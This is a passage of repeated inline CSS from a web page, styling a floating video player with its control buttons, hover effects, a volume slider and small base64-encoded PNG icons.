        text-align: left;
        direction: ltr;
        background-color: #000;
        overflow: hidden;
    }

    .XIK3pilOtc3FkAO3vh4Y video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #000;
    }
</style><style>.hPgVrsnJ7H8GeW9du_64 {
    position: absolute;
    bottom: 10px;
    border-radius: 6px;
    transition: all ease 200ms;
    cursor: pointer;
    z-index: 100;
    background-color: rgba(103, 103, 103, 0.4);
}

    .hPgVrsnJ7H8GeW9du_64:hover {
        background-color: rgba(103, 103, 103, 0.65);
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='true'] {
        display: none;
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='false'] {
        display: inline-block;
    }
.m3WlbIU44y_Rddhpkizv {
    left: 10px;
}
.XJV1AgGU0406rTJYtBmv {
    right: 10px;
}

.UyqeI7iVGGYgjPrc0fUx {
    display: inline-block;
    width: 34px;
    height: 28px;
    background-size: auto 20px;
    background-position: center;
    background-repeat: no-repeat;
}

.xhuCryf7wy9hnKLnO3mr {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAZRJREFUWAntlD1Ow0AQhROEQPxUhI6egIS4QDgJEg00HCSHoEAiBXTkDHAGhBCiouICIAQ05ntOxtk1liJPbNN4pJednd15bzKZTafTWtsBZweSJFkHV870xdIQ3gePIFmMyZGN5gn4kLjMQeFLQWsNXEo0NB9bySwE++AhFDa/JFX56wgdg3cTzK/lGeOMZduK2Pwm16UmxYq0Ki+ARmpebkEvFGS/VxTP7nDosoxg6kAi8TdwD9IiWCWu/w3Fh/mcdM+By/JkkGwDiVsRA3wTv8FfDXO6tuHANYRdzDhshUrffAx2LcZ6B065/h3EZq4K8NiMIfbgOgLqgvAKduIbk13lQyhaxPosFxOJzg/rClD7o8HUeeUFTMXV/i2gtg/AC9DPMS4qgnhaNWflLU0OPmCwV5ANHLEesMGs/RVIbAiiaWev1/Ennk0wh5W9gqAhc91sBvScigyGc/A1l6nOCzTnEDyrS3mrUzfiRngTXP9bAVYNBZyBTyvE4o2uiB+AJxXRqHAohvYGGIWx1m874OnAL1FHkmqT29miAAAAAElFTkSuQmCC);
}
.vni7inUOOC7J4MGBpLjk {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmtJREFUWAntls9LVFEUx50MKgdnEQaSJC7CSNKFJSlKbdwJugsJWkn07wQtWkWCGKmrFkGbWoQgoqsSFyI0FEiLEApEg+L5+d6553GdH+/NjPN2c+A75957ft4z9517Ozra1K5AkxWIoqgLvG7S/HxmBL4NdkCU5AlxAcyCGdBZTfditcWkNRw9Qf4S5FP0FPAuGAGKcw3blVwud8w4plw8ShlgfAWVF2AhVMVhog/s+tCfB92gCJYw+Q93lGhsSji5xXgNDNua8bQEpId9AfYUKIktbN7DHV2wQS2O8WNk26AieLkNunnwUDyUEfAP87fgHxhDPgB3FFeAxcQDZQblPKwALmaRj4K/4B2y3VAf+TTzKfAD2SvJUisgpXoI59rMV7AHLoFHrA3BQ1pncgJuIOuVoGUJsKMIfANv8PtJzqE5AsV/BzIFV5Iil1zLEij5LP0S6DMjq8T9UMZ438/7xTNJwAfY8HzQc2M//aBHPMsEDnygq54bO/ID9ZVME7CAiTzLClz3kQ/LMrBD6VpylglM+MA6jCG5z4+FX1rMJAE+vQf41uFTQ9oEId30k+/iuqVaQgRVIxoA2rmdfHVDO3S6Ey4js5buumTLEiAQ/iM5t51XtGJkasNKQq3YfY5xAizE9wIKMeH0GZPnQIZp9BGF32Abd/HOZYQfXcvjGkPSc1Q1qAmNY6xHxSrQtXyGaiUeKmHf/HUsRwT5ArsHljVvhPzO7S1QxPZDaF9XBUIDHOpFpJeR62S1KoCenmT6GiaB/uoiqHiSsdY44fwO2AWJbwjEqY/SxqN7C5zr9bPYtIO2YbsCvgKnv2/cU9Aqw4MAAAAASUVORK5CYII=);
}

.qE4RXLqF7CjQDdMasnw6 {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAASlJREFUWAntVrERwjAMDNzRUbMAGzAD7AAzADUlzADMADvADDABC1DTURBedxROYjuSLZsCfPd3jqToFSUvpyj+y9GBsixPwMjhTm8GOa0XcACG6RlrDMRurCf2W2BQC0t3aZCb2wcu1kA/HfMns8lq2d9hmwO9ZIVYSG2mG4xToKNeiI3NY7vAN1YtwkPmc+lJ18fS4iPpHoE46baQcNwk3R0QJl0OAzMmTLrM5JIwku4C4ElXklkYW5GuU7+UVFVWzWRXmFbdpj2rxdmAQthWSTi9ghngJqceSDIyY+kjXALZP0KS4QaQnaC4IXbRINoD2QfRV0fxGU+s8x8p7D8dxxNVATMLqEy1nAXI5npIZY4OhElKoYC4sz2iAB1JBRagJ6mQAn7mnjeRiFQYoN5dcwAAAABJRU5ErkJggg==);
}

.amO0fvMIxb_ucTYvV4OP {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAEdJREFUWAnt17EKACAIBUDt//+5WtpsaCro3iIoYtxWxO/JHUCfqWY5U/VX73SvrcVb1QMIECBAgAABAgQIECBA4NaP7J27AxT1CDj6xo1AAAAAAElFTkSuQmCC);
}

.uMql69xeMJRRAFSeEWsw {
    display: flex;
    align-items: center;
}

.Pqaaul1UQQKVGE4TCoI6 {
    display: block;
    cursor: pointer;
    position: relative;
    transition: all ease 200ms;
    overflow: hidden;
}

.Pqaaul1UQQKVGE4TCoI6::before {
        background-color: gray;
        width: 4px;
        display: block;
        margin: 0 auto;
        content: '';
        height: 0;
        transition: all ease 200ms;
    }

.z04LWahYi2geDMSfLSxw {
        height: 8px;
        width: 8px;
        position: absolute;
        bottom: 0;
        left: 50%;
        margin-left: -4px;
        background-color: white;
        border-radius: 8px;
        pointer-events: none;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm {
        padding-top: 15px;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6::before, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm::before {
            height: 60px;
        }
.jtVk5NsEaEbv1yb3OYHQ {
    display: none;
}
</style><style>.qwkv7Kzk5cFgJHTQE3pI {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .qwkv7Kzk5cFgJHTQE3pI:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI.qcO7dv4mqUM9DLPbwAzk:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI video {
        width: 100% !important;
        height: auto !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }</style><style>.CfRoxRRBazrtMhqpT10t {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .CfRoxRRBazrtMhqpT10t video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }
</style><style>.XIK3pilOtc3FkAO3vh4Y {
    border-radius: 5px;
    border: 1px solid rgb(204, 204, 204);
    padding: 4px;
    overflow: visible;
    background-color: rgb(238, 238, 238);
    box-sizing: border-box;

    position: fixed;
    bottom: 0;
    right: 0;
}

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z {
        top: 25px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ {
        bottom: 10px;
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4 {
        left: -100%;
        transform: translateX(-100%);
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            left: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw {
        right: -100%;
        transform: translateX(100%);
    }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            right: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 5px 5px 5px 0;
    }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 5px 0 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 0px 5px 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 0 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t {
        height: auto;
        line-height: 20px;
        padding: 5px;
        padding-top: 0px;
        padding-bottom: 2px;
        position: absolute;
        background-color: rgb(238, 238, 238);
        border: 1px solid rgb(204, 204, 204);
        z-index: 59999;
        font-family: 'Trebuchet MS', Helvetica, Verdana, Arial;
        font-size: 12px;
        font-weight: 600;
        cursor: pointer;
        user-select: none;
        opacity: 1;
        transition: opacity 400ms ease-in-out;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.T0ZhlkVFofcorgvOmVUX {
            opacity: 0;
            pointer-events: none;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.xOQMf_Rk0_Ms1nbgeBR4 {
            left: -1px;
            right: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t._3Gerh5ThjjalwgOax2cw {
            right: -1px;
            left: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.vrYSniMeM3ePSlY2Ou3Z {
            bottom: -22px;
            border-top: none;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.pQmNKhbtigKnCfuTeMRQ {
            top: -22px;
            border-bottom: none;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .KU6taH6Iufu7hecLfdEz {
        position: relative;
        max-width: 100%;
        text-align: left;
        direction: ltr;
        background-color: #000;
        overflow: hidden;
    }

    .XIK3pilOtc3FkAO3vh4Y video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #000;
    }
</style><style>.hPgVrsnJ7H8GeW9du_64 {
    position: absolute;
    bottom: 10px;
    border-radius: 6px;
    transition: all ease 200ms;
    cursor: pointer;
    z-index: 100;
    background-color: rgba(103, 103, 103, 0.4);
}

    .hPgVrsnJ7H8GeW9du_64:hover {
        background-color: rgba(103, 103, 103, 0.65);
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='true'] {
        display: none;
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='false'] {
        display: inline-block;
    }
.m3WlbIU44y_Rddhpkizv {
    left: 10px;
}
.XJV1AgGU0406rTJYtBmv {
    right: 10px;
}

.UyqeI7iVGGYgjPrc0fUx {
    display: inline-block;
    width: 34px;
    height: 28px;
    background-size: auto 20px;
    background-position: center;
    background-repeat: no-repeat;
}

.xhuCryf7wy9hnKLnO3mr {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAZRJREFUWAntlD1Ow0AQhROEQPxUhI6egIS4QDgJEg00HCSHoEAiBXTkDHAGhBCiouICIAQ05ntOxtk1liJPbNN4pJednd15bzKZTafTWtsBZweSJFkHV870xdIQ3gePIFmMyZGN5gn4kLjMQeFLQWsNXEo0NB9bySwE++AhFDa/JFX56wgdg3cTzK/lGeOMZduK2Pwm16UmxYq0Ki+ARmpebkEvFGS/VxTP7nDosoxg6kAi8TdwD9IiWCWu/w3Fh/mcdM+By/JkkGwDiVsRA3wTv8FfDXO6tuHANYRdzDhshUrffAx2LcZ6B065/h3EZq4K8NiMIfbgOgLqgvAKduIbk13lQyhaxPosFxOJzg/rClD7o8HUeeUFTMXV/i2gtg/AC9DPMS4qgnhaNWflLU0OPmCwV5ANHLEesMGs/RVIbAiiaWev1/Ennk0wh5W9gqAhc91sBvScigyGc/A1l6nOCzTnEDyrS3mrUzfiRngTXP9bAVYNBZyBTyvE4o2uiB+AJxXRqHAohvYGGIWx1m874OnAL1FHkmqT29miAAAAAElFTkSuQmCC);
}
.vni7inUOOC7J4MGBpLjk {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmtJREFUWAntls9LVFEUx50MKgdnEQaSJC7CSNKFJSlKbdwJugsJWkn07wQtWkWCGKmrFkGbWoQgoqsSFyI0FEiLEApEg+L5+d6553GdH+/NjPN2c+A75957ft4z9517Ozra1K5AkxWIoqgLvG7S/HxmBL4NdkCU5AlxAcyCGdBZTfditcWkNRw9Qf4S5FP0FPAuGAGKcw3blVwud8w4plw8ShlgfAWVF2AhVMVhog/s+tCfB92gCJYw+Q93lGhsSji5xXgNDNua8bQEpId9AfYUKIktbN7DHV2wQS2O8WNk26AieLkNunnwUDyUEfAP87fgHxhDPgB3FFeAxcQDZQblPKwALmaRj4K/4B2y3VAf+TTzKfAD2SvJUisgpXoI59rMV7AHLoFHrA3BQ1pncgJuIOuVoGUJsKMIfANv8PtJzqE5AsV/BzIFV5Iil1zLEij5LP0S6DMjq8T9UMZ438/7xTNJwAfY8HzQc2M//aBHPMsEDnygq54bO/ID9ZVME7CAiTzLClz3kQ/LMrBD6VpylglM+MA6jCG5z4+FX1rMJAE+vQf41uFTQ9oEId30k+/iuqVaQgRVIxoA2rmdfHVDO3S6Ey4js5buumTLEiAQ/iM5t51XtGJkasNKQq3YfY5xAizE9wIKMeH0GZPnQIZp9BGF32Abd/HOZYQfXcvjGkPSc1Q1qAmNY6xHxSrQtXyGaiUeKmHf/HUsRwT5ArsHljVvhPzO7S1QxPZDaF9XBUIDHOpFpJeR62S1KoCenmT6GiaB/uoiqHiSsdY44fwO2AWJbwjEqY/SxqN7C5zr9bPYtIO2YbsCvgKnv2/cU9Aqw4MAAAAASUVORK5CYII=);
}

.qE4RXLqF7CjQDdMasnw6 {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAASlJREFUWAntVrERwjAMDNzRUbMAGzAD7AAzADUlzADMADvADDABC1DTURBedxROYjuSLZsCfPd3jqToFSUvpyj+y9GBsixPwMjhTm8GOa0XcACG6RlrDMRurCf2W2BQC0t3aZCb2wcu1kA/HfMns8lq2d9hmwO9ZIVYSG2mG4xToKNeiI3NY7vAN1YtwkPmc+lJ18fS4iPpHoE46baQcNwk3R0QJl0OAzMmTLrM5JIwku4C4ElXklkYW5GuU7+UVFVWzWRXmFbdpj2rxdmAQthWSTi9ghngJqceSDIyY+kjXALZP0KS4QaQnaC4IXbRINoD2QfRV0fxGU+s8x8p7D8dxxNVATMLqEy1nAXI5npIZY4OhElKoYC4sz2iAB1JBRagJ6mQAn7mnjeRiFQYoN5dcwAAAABJRU5ErkJggg==);
}

.amO0fvMIxb_ucTYvV4OP {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAEdJREFUWAnt17EKACAIBUDt//+5WtpsaCro3iIoYtxWxO/JHUCfqWY5U/VX73SvrcVb1QMIECBAgAABAgQIECBA4NaP7J27AxT1CDj6xo1AAAAAAElFTkSuQmCC);
}

.uMql69xeMJRRAFSeEWsw {
    display: flex;
    align-items: center;
}

.Pqaaul1UQQKVGE4TCoI6 {
    display: block;
    cursor: pointer;
    position: relative;
    transition: all ease 200ms;
    overflow: hidden;
}

.Pqaaul1UQQKVGE4TCoI6::before {
        background-color: gray;
        width: 4px;
        display: block;
        margin: 0 auto;
        content: '';
        height: 0;
        transition: all ease 200ms;
    }

.z04LWahYi2geDMSfLSxw {
        height: 8px;
        width: 8px;
        position: absolute;
        bottom: 0;
        left: 50%;
        margin-left: -4px;
        background-color: white;
        border-radius: 8px;
        pointer-events: none;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm {
        padding-top: 15px;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6::before, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm::before {
            height: 60px;
        }
.jtVk5NsEaEbv1yb3OYHQ {
    display: none;
}
</style><style>.qwkv7Kzk5cFgJHTQE3pI {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .qwkv7Kzk5cFgJHTQE3pI:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI.qcO7dv4mqUM9DLPbwAzk:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI video {
        width: 100% !important;
        height: auto !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }</style><style>.CfRoxRRBazrtMhqpT10t {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .CfRoxRRBazrtMhqpT10t video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }
</style><style>.XIK3pilOtc3FkAO3vh4Y {
    border-radius: 5px;
    border: 1px solid rgb(204, 204, 204);
    padding: 4px;
    overflow: visible;
    background-color: rgb(238, 238, 238);
    box-sizing: border-box;

    position: fixed;
    bottom: 0;
    right: 0;
}

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z {
        top: 25px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ {
        bottom: 10px;
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4 {
        left: -100%;
        transform: translateX(-100%);
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            left: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw {
        right: -100%;
        transform: translateX(100%);
    }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            right: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 5px 5px 5px 0;
    }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 5px 0 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 0px 5px 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 0 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t {
        height: auto;
        line-height: 20px;
        padding: 5px;
        padding-top: 0px;
        padding-bottom: 2px;
        position: absolute;
        background-color: rgb(238, 238, 238);
        border: 1px solid rgb(204, 204, 204);
        z-index: 59999;
        font-family: 'Trebuchet MS', Helvetica, Verdana, Arial;
        font-size: 12px;
        font-weight: 600;
        cursor: pointer;
        user-select: none;
        opacity: 1;
        transition: opacity 400ms ease-in-out;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.T0ZhlkVFofcorgvOmVUX {
            opacity: 0;
            pointer-events: none;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.xOQMf_Rk0_Ms1nbgeBR4 {
            left: -1px;
            right: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t._3Gerh5ThjjalwgOax2cw {
            right: -1px;
            left: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.vrYSniMeM3ePSlY2Ou3Z {
            bottom: -22px;
            border-top: none;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.pQmNKhbtigKnCfuTeMRQ {
            top: -22px;
            border-bottom: none;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .KU6taH6Iufu7hecLfdEz {
        position: relative;
        max-width: 100%;
        text-align: left;
        direction: ltr;
        background-color: #000;
        overflow: hidden;
    }

    .XIK3pilOtc3FkAO3vh4Y video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #000;
    }
</style><style>.hPgVrsnJ7H8GeW9du_64 {
    position: absolute;
    bottom: 10px;
    border-radius: 6px;
    transition: all ease 200ms;
    cursor: pointer;
    z-index: 100;
    background-color: rgba(103, 103, 103, 0.4);
}

    .hPgVrsnJ7H8GeW9du_64:hover {
        background-color: rgba(103, 103, 103, 0.65);
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='true'] {
        display: none;
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='false'] {
        display: inline-block;
    }
.m3WlbIU44y_Rddhpkizv {
    left: 10px;
}
.XJV1AgGU0406rTJYtBmv {
    right: 10px;
}

.UyqeI7iVGGYgjPrc0fUx {
    display: inline-block;
    width: 34px;
    height: 28px;
    background-size: auto 20px;
    background-position: center;
    background-repeat: no-repeat;
}

.xhuCryf7wy9hnKLnO3mr {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAZRJREFUWAntlD1Ow0AQhROEQPxUhI6egIS4QDgJEg00HCSHoEAiBXTkDHAGhBCiouICIAQ05ntOxtk1liJPbNN4pJednd15bzKZTafTWtsBZweSJFkHV870xdIQ3gePIFmMyZGN5gn4kLjMQeFLQWsNXEo0NB9bySwE++AhFDa/JFX56wgdg3cTzK/lGeOMZduK2Pwm16UmxYq0Ki+ARmpebkEvFGS/VxTP7nDosoxg6kAi8TdwD9IiWCWu/w3Fh/mcdM+By/JkkGwDiVsRA3wTv8FfDXO6tuHANYRdzDhshUrffAx2LcZ6B065/h3EZq4K8NiMIfbgOgLqgvAKduIbk13lQyhaxPosFxOJzg/rClD7o8HUeeUFTMXV/i2gtg/AC9DPMS4qgnhaNWflLU0OPmCwV5ANHLEesMGs/RVIbAiiaWev1/Ennk0wh5W9gqAhc91sBvScigyGc/A1l6nOCzTnEDyrS3mrUzfiRngTXP9bAVYNBZyBTyvE4o2uiB+AJxXRqHAohvYGGIWx1m874OnAL1FHkmqT29miAAAAAElFTkSuQmCC);
}
.vni7inUOOC7J4MGBpLjk {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmtJREFUWAntls9LVFEUx50MKgdnEQaSJC7CSNKFJSlKbdwJugsJWkn07wQtWkWCGKmrFkGbWoQgoqsSFyI0FEiLEApEg+L5+d6553GdH+/NjPN2c+A75957ft4z9517Ozra1K5AkxWIoqgLvG7S/HxmBL4NdkCU5AlxAcyCGdBZTfditcWkNRw9Qf4S5FP0FPAuGAGKcw3blVwud8w4plw8ShlgfAWVF2AhVMVhog/s+tCfB92gCJYw+Q93lGhsSji5xXgNDNua8bQEpId9AfYUKIktbN7DHV2wQS2O8WNk26AieLkNunnwUDyUEfAP87fgHxhDPgB3FFeAxcQDZQblPKwALmaRj4K/4B2y3VAf+TTzKfAD2SvJUisgpXoI59rMV7AHLoFHrA3BQ1pncgJuIOuVoGUJsKMIfANv8PtJzqE5AsV/BzIFV5Iil1zLEij5LP0S6DMjq8T9UMZ438/7xTNJwAfY8HzQc2M//aBHPMsEDnygq54bO/ID9ZVME7CAiTzLClz3kQ/LMrBD6VpylglM+MA6jCG5z4+FX1rMJAE+vQf41uFTQ9oEId30k+/iuqVaQgRVIxoA2rmdfHVDO3S6Ey4js5buumTLEiAQ/iM5t51XtGJkasNKQq3YfY5xAizE9wIKMeH0GZPnQIZp9BGF32Abd/HOZYQfXcvjGkPSc1Q1qAmNY6xHxSrQtXyGaiUeKmHf/HUsRwT5ArsHljVvhPzO7S1QxPZDaF9XBUIDHOpFpJeR62S1KoCenmT6GiaB/uoiqHiSsdY44fwO2AWJbwjEqY/SxqN7C5zr9bPYtIO2YbsCvgKnv2/cU9Aqw4MAAAAASUVORK5CYII=);
}

.qE4RXLqF7CjQDdMasnw6 {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAASlJREFUWAntVrERwjAMDNzRUbMAGzAD7AAzADUlzADMADvADDABC1DTURBedxROYjuSLZsCfPd3jqToFSUvpyj+y9GBsixPwMjhTm8GOa0XcACG6RlrDMRurCf2W2BQC0t3aZCb2wcu1kA/HfMns8lq2d9hmwO9ZIVYSG2mG4xToKNeiI3NY7vAN1YtwkPmc+lJ18fS4iPpHoE46baQcNwk3R0QJl0OAzMmTLrM5JIwku4C4ElXklkYW5GuU7+UVFVWzWRXmFbdpj2rxdmAQthWSTi9ghngJqceSDIyY+kjXALZP0KS4QaQnaC4IXbRINoD2QfRV0fxGU+s8x8p7D8dxxNVATMLqEy1nAXI5npIZY4OhElKoYC4sz2iAB1JBRagJ6mQAn7mnjeRiFQYoN5dcwAAAABJRU5ErkJggg==);
}

.amO0fvMIxb_ucTYvV4OP {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAEdJREFUWAnt17EKACAIBUDt//+5WtpsaCro3iIoYtxWxO/JHUCfqWY5U/VX73SvrcVb1QMIECBAgAABAgQIECBA4NaP7J27AxT1CDj6xo1AAAAAAElFTkSuQmCC);
}

.uMql69xeMJRRAFSeEWsw {
    display: flex;
    align-items: center;
}

.Pqaaul1UQQKVGE4TCoI6 {
    display: block;
    cursor: pointer;
    position: relative;
    transition: all ease 200ms;
    overflow: hidden;
}

.Pqaaul1UQQKVGE4TCoI6::before {
        background-color: gray;
        width: 4px;
        display: block;
        margin: 0 auto;
        content: '';
        height: 0;
        transition: all ease 200ms;
    }

.z04LWahYi2geDMSfLSxw {
        height: 8px;
        width: 8px;
        position: absolute;
        bottom: 0;
        left: 50%;
        margin-left: -4px;
        background-color: white;
        border-radius: 8px;
        pointer-events: none;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm {
        padding-top: 15px;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6::before, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm::before {
            height: 60px;
        }
.jtVk5NsEaEbv1yb3OYHQ {
    display: none;
}
</style><style>.qwkv7Kzk5cFgJHTQE3pI {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .qwkv7Kzk5cFgJHTQE3pI:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI.qcO7dv4mqUM9DLPbwAzk:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI video {
        width: 100% !important;
        height: auto !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }</style><style>.CfRoxRRBazrtMhqpT10t {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .CfRoxRRBazrtMhqpT10t video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
